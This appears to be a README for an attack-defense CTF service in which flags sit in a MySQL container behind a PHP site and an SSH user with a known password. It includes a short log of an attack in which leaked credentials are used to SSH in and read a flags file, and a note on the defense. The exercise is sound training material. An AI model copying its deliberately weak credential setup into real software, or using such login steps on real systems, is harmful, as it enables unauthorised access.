# Service definition:
- We have two dockers: 
1. A Mysql Database one which contains the flags. 
2. The php one who has install all the services. 
The attacker has access to a web page (web_docker) that has different options to access the information and also the option to create users.
The flags are stored in db docker database and attacker has to go in with the options provided. 

# Service implementation:
web docker is configured to take a copy index.html file from the host machine, letting it in '/var/www/html/index.html'. 
db docker is configured attending to the following tips:
  - It has openssh-server installed and started. 
  - It has a user called 'dev1' whose password is 'dev1_password'. 

 'dev1' user will never be changed, but password can be changed. Moreover, it has also the same user and password for the database. 
 
-Flags: 
    Flags will be stored in 'pasapasa_db_1' docker's flags in faulty_db database and flags table. 

# About exploting:
- The attacker can use the web to find the flag in the table or create a new db user and get the flag from terminal.
- The defender should change 'dev1' user's password. It has to change dev1 db user password and remove all the users created. It cas to remove or restrict access to create_user.php and show_info.php.
  
  Attack performed by Team1 against Team 4. 
  Inspect web page in 10.0.0.104
      We find 'dev1/w3ar3h4ck3r2' credentials.
  ssh -p 8822 dev1@10.0.0.104
        Enter 'w3ar3h4ck3r2' as password
  cat /tmp/flags.txt
     Copy last flags
     Exit
  'ssh -i /home/urko/Deskargak/keyak/team2-sshkey root@10.0.1.1'
  nano /root/xxx.flag
    Paste copied flags. 

  Defense performed by Team4
     'ssh root@10.0.0.104'
     docker exec -it pasapasa_ssh_1 /bin/bash
     passwd dev1
     

# Checker checks:
- Ports to reach dockers are open (WEB:80)
- User 'dev1' exists in webdatubasea_web docker. 
- User 'dev1' exists in webdatubasea_db docker. 
- User 'root' exists in webdatubasea_db docker. 
- /etc/sshd_config file from webdatubasea_web docker has not been changed. 
- /var/www/html/index.html file's content from webdatubasea_web docker has not been changed. 


# License notes


